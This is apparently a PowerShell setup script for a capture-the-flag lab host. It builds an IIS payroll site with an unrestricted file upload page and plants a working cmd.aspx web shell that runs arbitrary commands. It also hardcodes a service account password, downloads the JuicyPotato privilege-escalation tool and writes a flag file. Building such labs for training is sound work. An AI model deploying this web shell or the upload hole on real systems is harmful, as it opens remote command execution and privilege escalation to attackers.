# WEB01 Configuration Script
# Installs IIS, deploys vulnerable web app, configures service account

$ErrorActionPreference = "Stop"

# Variables
$DomainName = "lab.local"
$ServiceAccount = "svc_payroll"
$ServiceAccountPassword = "P@yrollSvc!"

# Install IIS and ASP.NET features
Write-Host "Installing IIS and ASP.NET..."
Install-WindowsFeature -Name Web-Server, Web-ASP, Web-Asp-Net45, Web-Mgmt-Tools -IncludeManagementTools

# Create web application directory
$WebRoot = "C:\inetpub\wwwroot\payroll"
New-Item -ItemType Directory -Path $WebRoot -Force

# Create a simple vulnerable file upload page (Default.aspx)
Write-Host "Creating vulnerable web application..."
$DefaultPage = @"
<%@ Page Language="C#" %>
<%@ Import Namespace="System.IO" %>
<!DOCTYPE html>
<html>
<head>
    <title>Attendance & Payroll System</title>
</head>
<body>
    <h1>Attendance & Payroll System</h1>
    <h3>File Upload</h3>
    <form method="post" enctype="multipart/form-data">
        <input type="file" name="file" />
        <input type="submit" value="Upload" />
    </form>
    <%
        if (Request.Files.Count > 0) {
            var file = Request.Files[0];
            var fileName = Path.GetFileName(file.FileName);
            var path = Server.MapPath("~/uploads/") + fileName;
            file.SaveAs(path);
            Response.Write("File uploaded: <a href='uploads/" + fileName + "'>" + fileName + "</a>");
        }
    %>
    <hr />
    <h3>Employee Search</h3>
    <form method="get">
        <input type="text" name="query" />
        <input type="submit" value="Search" />
    </form>
    <%
        if (!string.IsNullOrEmpty(Request.QueryString["query"])) {
            var query = Request.QueryString["query"];
            // Simulate command injection vulnerability (disabled for safety)
            // Response.Write("Search results for: " + query);
        }
    %>
</body>
</html>
"@
$DefaultPage | Out-File -FilePath "$WebRoot\Default.aspx" -Encoding ascii

# Create uploads directory with write permissions
$UploadDir = "$WebRoot\uploads"
New-Item -ItemType Directory -Path $UploadDir -Force

# Create a simple web shell (cmd.aspx) for RCE
$WebShell = @"
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%
    string cmd = Request["cmd"];
    if (!string.IsNullOrEmpty(cmd)) {
        Process proc = new Process();
        proc.StartInfo.FileName = "cmd.exe";
        proc.StartInfo.Arguments = "/c " + cmd;
        proc.StartInfo.UseShellExecute = false;
        proc.StartInfo.RedirectStandardOutput = true;
        proc.StartInfo.RedirectStandardError = true;
        proc.Start();
        string output = proc.StandardOutput.ReadToEnd();
        string error = proc.StandardError.ReadToEnd();
        proc.WaitForExit();
        Response.Write("<pre>" + output + error + "</pre>");
    }
%>
<form method="post">
    <input type="text" name="cmd" size="80" />
    <input type="submit" value="Execute" />
</form>
"@
$WebShell | Out-File -FilePath "$UploadDir\cmd.aspx" -Encoding ascii

# Set permissions on uploads directory to allow app pool identity
$Acl = Get-Acl $UploadDir
$Ar1 = New-Object System.Security.AccessControl.FileSystemAccessRule("IIS_IUSRS", "FullControl", "ContainerInherit,ObjectInherit", "None", "Allow")
$Acl.SetAccessRule($Ar1)
$Ar2 = New-Object System.Security.AccessControl.FileSystemAccessRule("$DomainName\$ServiceAccount", "FullControl", "ContainerInherit,ObjectInherit", "None", "Allow")
$Acl.SetAccessRule($Ar2)
Set-Acl -Path $UploadDir -AclObject $Acl

# Configure IIS App Pool
Write-Host "Configuring IIS App Pool..."
Import-Module WebAdministration
$AppPoolName = "PayrollAppPool"
New-WebAppPool -Name $AppPoolName
Set-ItemProperty "IIS:\AppPools\$AppPoolName" -Name processModel.identityType -Value 3  # Custom identity
Set-ItemProperty "IIS:\AppPools\$AppPoolName" -Name processModel.userName -Value "$DomainName\$ServiceAccount"
Set-ItemProperty "IIS:\AppPools\$AppPoolName" -Name processModel.password -Value $ServiceAccountPassword

# Create web site
New-Website -Name "Payroll" -PhysicalPath $WebRoot -ApplicationPool $AppPoolName -Port 80

# Add domain user to local IIS_IUSRS group
try {
    Add-LocalGroupMember -Group "IIS_IUSRS" -Member "$DomainName\$ServiceAccount" -ErrorAction Stop
    Write-Host "Added $DomainName\$ServiceAccount to local IIS_IUSRS group."
} catch {
    Write-Host "User already in IIS_IUSRS group or error: $_"
}

# Install JuicyPotato binary for privilege escalation
$JuicyPotatoUrl = "https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe"
$JuicyPath = "C:\Windows\Temp\JuicyPotato.exe"
Invoke-WebRequest -Uri $JuicyPotatoUrl -OutFile $JuicyPath

# Create proof file on desktop
$ProofContent = "FLAG: WEB01_COMPROMISED_{Upl04d_1s_Fun}"
$ProofPath = "C:\Users\Administrator\Desktop\proof.txt"
$ProofContent | Out-File -FilePath $ProofPath -Encoding ascii

Write-Host "WEB01 configuration completed successfully."
